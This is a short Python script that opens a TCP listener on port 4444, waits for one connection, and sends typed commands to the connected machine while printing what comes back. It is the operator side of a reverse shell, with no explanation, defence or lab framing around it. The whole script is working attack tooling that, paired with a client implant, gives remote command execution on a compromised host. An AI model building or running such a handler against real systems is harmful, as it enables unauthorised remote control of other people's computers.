#!/usr/bin/python

import socket
import sys
# ip = socket.gethostbyname(socket.gethostname())
ip = "127.0.0.1"
port = 4444

sex = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sex.bind((ip,port))
sex.listen(1)
print("listening.........")
conn , ip = sex.accept()
print(f"We got a connection by {ip[0]} from the port {ip[1]}")
while(True):
	print("Now your command")
	command = input(">")
	command = command.encode()
	if command == b'/exit':
		sys.exit()
	conn.send(command)
	output = conn.recv(1024).decode()
	print(output)

	
